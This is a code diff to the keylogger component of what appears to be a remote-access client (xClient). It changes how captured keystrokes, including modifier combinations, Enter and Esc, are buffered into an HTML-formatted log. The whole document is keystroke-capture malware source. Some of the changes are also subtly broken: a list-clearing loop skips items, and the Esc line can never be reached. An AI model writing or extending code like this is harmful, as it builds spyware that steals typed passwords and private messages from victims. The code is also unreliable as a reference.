@@ -24,6 +24,7 @@ namespace xClient.Core.Keylogger
         private readonly System.Timers.Timer _timerFlush;
 
         private List<Keys> _pressedKeys = new List<Keys>();
+        private List<char> _pressedKeyChars = new List<char>();
 
         private IKeyboardMouseEvents _mEvents;
 
@@ -132,15 +133,34 @@ namespace xClient.Core.Keylogger
             }
         }
 
+        //This method should be used to process all of our unicode characters
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            //This method should be used to process all of our unicode characters
-            _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
+            if (!_pressedKeyChars.Contains(e.KeyChar))
+            {
+                _pressedKeyChars.Add(e.KeyChar);
+                _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
+            }
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
+            for (int i = 0; i < _pressedKeyChars.Count; i++)
+                _pressedKeyChars.RemoveAt(i);
+        }
+
+        private bool ModifierKeysSet()
+        {
+            if (_pressedKeys.Contains(Keys.LControlKey)
+                || _pressedKeys.Contains(Keys.RControlKey)
+                || _pressedKeys.Contains(Keys.LMenu)
+                || _pressedKeys.Contains(Keys.RMenu)
+                || _pressedKeys.Contains(Keys.LWin)
+                || _pressedKeys.Contains(Keys.RWin))
+                return true;
+            else
+                return false;
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -153,12 +173,7 @@ namespace xClient.Core.Keylogger
                 names[i] = LoggerHelper.GetDisplayName(keys[i].ToString());
             }
 
-            if (_pressedKeys.Contains(Keys.LControlKey)
-                || _pressedKeys.Contains(Keys.RControlKey)
-                || _pressedKeys.Contains(Keys.LMenu)
-                || _pressedKeys.Contains(Keys.RMenu)
-                || _pressedKeys.Contains(Keys.LWin)
-                || _pressedKeys.Contains(Keys.RWin))
+            if (ModifierKeysSet())
             {
                 StringBuilder specialKeys = new StringBuilder();
 
@@ -193,6 +208,8 @@ namespace xClient.Core.Keylogger
                         break;
                     case "Enter":
                         normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
+                        break;
+                        normalKeys.Append(@"<p class=""h"">[Esc]</p><br>");
                         break;
                     default:
                         normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
